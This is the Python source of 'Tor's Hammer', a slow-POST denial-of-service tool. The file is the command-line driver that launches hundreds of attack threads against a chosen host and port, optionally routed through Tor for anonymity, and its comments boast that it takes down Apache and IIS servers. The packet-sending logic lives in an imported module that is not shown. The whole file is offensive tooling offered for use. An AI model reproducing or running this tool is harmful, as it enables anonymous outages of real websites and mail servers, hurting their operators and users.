#!/usr/bin/python

# this assumes you have the socks.py (http://phiral.net/socks.py)
# and terminal.py (http://phiral.net/terminal.py) in the
# same directory and that you have tor running locally
# on port 9050. run with 128 to 256 threads to be effective.
# kills apache 1.X with ~128, apache 2.X / IIS with ~256
# not effective on nginx

import os
import re
import time
import sys
import random
import math
import getopt
import string

# local imports
import terminal
import channel

from threading import Thread

global stop_now
global term

stop_now = False
term = terminal.TerminalController()

def usage():
    print "./torshammer.py -t <target> [-r <threads> -p <port> -T -h]"
    print " -h|--help    Shows this help"
    print " -s|--smtp    SMTP attack (port defaults to 25)"
    print " -T|--tor     Enable anonymising through tor on 127.0.0.1:9050"
    print " -t|--target  <host|IP>"
    print " -p|--port    <port> Defaults to 80"
    print " -r|--threads <Number of threads> Defaults to 256"
    print "\nEg. ./torshammer.py -t 192.168.1.100 -r 256\n"

def main(argv):

    try:
        opts, args = getopt.getopt(argv, "hTst:r:p:", ["help", "tor", "smtp", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    threads = 256
    tor = False
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-s", "--smtp"):
            port = 25
            smtp = True
        elif o in ("-t", "--target"):
            target = a
        if o in ("-T", "--tor"):
            tor = True

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print term.DOWN + term.RED + "/*" + term.NORMAL
    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL

    rthreads = []
    for i in range(threads):
        t = channel.http(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print "\n/*"
    print " *"+term.RED + " Tor's Hammer "+term.NORMAL
    print " * Slow POST DoS Testing Tool"
    print " * entropy [at] phiral.net"
    print " * Anon-ymized via Tor"
    print " * We are Legion."
    print " */\n"

    main(sys.argv[1:])

